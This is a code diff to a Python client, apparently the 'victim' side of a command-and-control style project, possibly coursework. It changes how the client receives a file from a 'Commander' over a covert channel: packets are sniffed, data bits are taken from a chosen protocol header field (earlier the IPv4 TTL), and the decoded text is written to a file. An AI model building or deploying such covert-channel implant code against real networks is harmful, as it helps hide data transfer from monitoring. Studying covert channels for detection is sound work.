@@ -223,49 +223,40 @@ if __name__ == '__main__':
 
 
 
-                # e) Receive File from Commander
+                # e) Receive File from Commander (Covert Channel)
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
 
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
 
-                    # Call to receive the file data and checksum from the client
-                    filename = client_socket.recv(1024).decode()
+                    # Get configuration from commander (filename, header, header_field)
+                    res = client_socket.recv(1024).decode().split("/")
+                    filename = res[0]
+                    choices = (res[1], res[2])  # => (header, header_field)
+
+                    # Print configuration
                     print(constants.RECEIVING_FILE_MSG.format(filename))
+                    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(choices[0], choices[1]))
+                    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(choices[0], choices[1]))
 
                     # Get total count of packets
                     count = int(client_socket.recv(1024).decode())
-                    print(constants.CLIENT_RESPONSE.format("Total Number of Packets: {}".format(count)))
+                    print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
 
-                    # Function to extract and decode the TTL values to retrieve data
-                    def extract_data_ipv4_ttl(packet):
-                        if packet.haslayer('IP'):
-                            ttl = packet[IP].ttl
-                            binary_data = format(ttl, constants.BINARY_MODE)  # Adjust to 8 bits for each character
-                            return binary_data
+                    # Get function handler from a map (according to header/field)
+                    header_field_function_map = get_protocol_header_function_map()
+                    if choices in header_field_function_map:
+                        selected_function = header_field_function_map.get(choices)
 
-                    # Function to convert binary data to text
-                    def bin_to_text(binary_data):
-                        text = ''
-
-                        for i in range(0, len(binary_data), 8):
-                            byte = binary_data[i:i + 8]
-                            if byte != '00000000':  # Ensure not to append null bytes
-                                text += chr(int(byte, 2))
-
-                        # Filter out non-printable characters
-                        text = ''.join(filter(lambda x: x in string.printable, text))
-                        return text
-
-                    # Callback function for handling received packets
+                    # A callback function for handling of received packets
                     def packet_callback(packet):
                         global filename
-                        binary_data = extract_data_ipv4_ttl(packet)
+                        binary_data = selected_function(packet)
 
                         if binary_data:
                             text_data = bin_to_text(binary_data)
-                            with open(filename, 'a') as f:
+                            with open(filename, constants.APPEND_MODE) as f:
                                 f.write(text_data)
 
                     # Start sniffing for a specific number of packets
@@ -277,7 +268,6 @@ if __name__ == '__main__':
                         client_socket.send(constants.VICTIM_ACK.encode())
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-
 
 
                 # f) Transfer file to Commander
